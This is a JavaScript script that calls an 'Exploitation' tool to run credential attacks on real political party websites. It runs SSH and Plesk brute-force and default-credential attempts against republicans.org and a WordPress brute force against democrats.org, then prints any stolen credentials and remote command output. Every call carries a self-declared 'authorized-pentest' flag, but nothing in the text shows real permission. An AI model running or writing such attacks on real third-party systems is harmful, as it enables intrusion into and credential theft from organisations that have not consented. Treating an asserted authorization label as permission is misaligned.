import { createTaoTools } from './dist/tools/taoTools.js';

async function testExploitation() {
  console.log('=== Real Exploitation Testing ===\n');
  
  const taoTools = createTaoTools();
  const exploitationTool = taoTools.tools.find(t => t.name === 'Exploitation');
  
  if (!exploitationTool) {
    console.error('Exploitation tool not found!');
    return;
  }
  
  console.log('1. Testing SSH Brute Force on republicans.org...');
  try {
    const result = await exploitationTool.handler({
      target: 'republicans.org',
      exploitType: 'ssh_brute',
      ports: { ssh: 22 },
      authContext: 'authorized-pentest'
    });
    
    const parsed = JSON.parse(result);
    console.log(`✓ SSH brute force completed`);
    console.log(`  Success: ${parsed.sshBrute?.success || false}`);
    if (parsed.sshBrute?.successfulCredential) {
      console.log(`  Credentials: ${parsed.sshBrute.successfulCredential.username}:${parsed.sshBrute.successfulCredential.password}`);
      console.log(`  Access Gained: ${parsed.accessGained ? 'YES' : 'NO'}`);
      
      if (parsed.commandExecution) {
        console.log(`  Command Output:`);
        if (Array.isArray(parsed.commandExecution)) {
          parsed.commandExecution.slice(0, 10).forEach(line => console.log(`    ${line}`));
        } else {
          console.log(`    ${parsed.commandExecution}`);
        }
      }
    } else {
      console.log(`  No successful credentials found`);
      console.log(`  Credentials tested: ${parsed.sshBrute?.credentialsTested || 0}`);
    }
  } catch (error) {
    console.log(`  SSH brute force error: ${error.message}`);
  }
  
  console.log('\n---\n');
  
  console.log('2. Testing WordPress Brute Force on democrats.org...');
  try {
    const result = await exploitationTool.handler({
      target: 'democrats.org',
      exploitType: 'wordpress_brute',
      authContext: 'authorized-pentest'
    });
    
    const parsed = JSON.parse(result);
    console.log(`✓ WordPress brute force completed`);
    console.log(`  Success: ${parsed.wordpressBrute?.success || false}`);
    
    if (parsed.wordpressBrute?.successfulCredential) {
      console.log(`  Credentials: ${parsed.wordpressBrute.successfulCredential.username}:${parsed.wordpressBrute.successfulCredential.password}`);
      console.log(`  Access Gained: ${parsed.accessGained ? 'YES' : 'NO'}`);
    } else {
      console.log(`  No successful credentials found`);
      if (parsed.wordpressBrute?.error) {
        console.log(`  Error: ${parsed.wordpressBrute.error}`);
      } else {
        console.log(`  Users tested: ${parsed.wordpressBrute?.usernamesTested || 0}`);
        console.log(`  Passwords per user: ${parsed.wordpressBrute?.passwordsPerUser || 0}`);
      }
    }
  } catch (error) {
    console.log(`  WordPress brute force error: ${error.message}`);
  }
  
  console.log('\n---\n');
  
  console.log('3. Testing Plesk Exploitation on republicans.org...');
  try {
    const result = await exploitationTool.handler({
      target: 'republicans.org',
      exploitType: 'plesk_exploit',
      ports: { plesk: 8443 },
      authContext: 'authorized-pentest'
    });
    
    const parsed = JSON.parse(result);
    console.log(`✓ Plesk exploitation completed`);
    console.log(`  Plesk Detected: ${parsed.pleskDetected || false}`);
    console.log(`  Plesk Access: ${parsed.pleskAccess || false}`);
    
    if (parsed.pleskAccess) {
      console.log(`  Credentials: ${parsed.pleskCredentials.username}:${parsed.pleskCredentials.password}`);
      console.log(`  Access Gained: ${parsed.accessGained ? 'YES' : 'NO'}`);
    } else if (parsed.pleskDetected) {
      console.log(`  Plesk detected but default credentials failed`);
      console.log(`  Default credentials tested: 4`);
    } else {
      console.log(`  No Plesk control panel detected on port 8443`);
    }
  } catch (error) {
    console.log(`  Plesk exploitation error: ${error.message}`);
  }
  
  console.log('\n=== Summary ===');
  console.log('Enhanced exploitation capabilities now include:');
  console.log('• SSH brute force with command execution');
  console.log('• WordPress credential brute forcing');
  console.log('• Plesk control panel exploitation');
  console.log('• FTP anonymous access testing');
  console.log('• Evidence collection for audit trails');
  console.log('\nNote: All exploitation attempts performed with authorization context.');
}

testExploitation().catch(console.error);